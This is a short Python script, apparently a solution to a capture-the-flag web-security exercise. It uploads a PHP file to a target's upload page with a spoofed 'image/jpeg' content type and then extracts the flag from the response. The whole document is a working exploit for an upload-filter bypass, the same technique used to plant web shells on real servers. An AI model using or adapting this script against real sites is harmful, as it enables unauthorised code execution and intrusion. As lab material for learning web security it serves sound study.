import os
import requests
import re

ip = os.getenv('darkly_ip')
url = f'http://{ip}/index.php?page=upload'

if __name__ == '__main__':
    with open('toto.php', 'rb') as f:
        file = {'uploaded': ('toto.php', f, 'image/jpeg')}
        r = requests.post(url, files=file, data={
            'MAX_FILE_SIZE': 10_000,
            'Upload': 'Upload'
        })
        m = re.findall('The flag is : ([a-z0-9]+)', r.text)
        print(*m)
